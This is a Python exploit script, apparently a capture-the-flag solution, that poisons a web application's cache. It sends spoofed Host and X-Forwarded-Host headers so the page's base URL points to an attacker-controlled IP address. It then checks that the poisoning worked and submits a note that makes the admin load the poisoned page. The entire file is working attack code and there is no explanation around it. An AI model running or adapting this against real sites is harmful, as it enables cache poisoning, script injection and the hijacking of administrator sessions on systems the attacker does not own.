#!/usr/bin/env python3
from requests import *
from bs4 import BeautifulSoup as BS
from sys import *

# url of the web app
url = "http://46.101.2.216:30892/"

# malicious server hostname (for cache poisoning) 
hostname="117.214.152.63"

# At first get count of notes
count = int(get(url+'message/1').json()["count"])
print(f"count : {count}")

# poison the (count+1) endpoint , before sending new note to admin
print("poisoning cache")
r=get(url+f'letters?id={count+1}',headers={"Host":"127.0.0.1","X-Forwarded-Host":hostname})

if r.status_code == 200:
  soup = BS(r.text,'lxml')
  if soup.find('base')['href'] == "http://117.214.152.63:80/static/":
    print("Cache Poison Successfully.")
  else:
    print("Try manually or wait for cache to expire.")

# send the note to admin
print("sending note to admin")
print(post(url+'submit',json={"message":"You are hacked!"}))
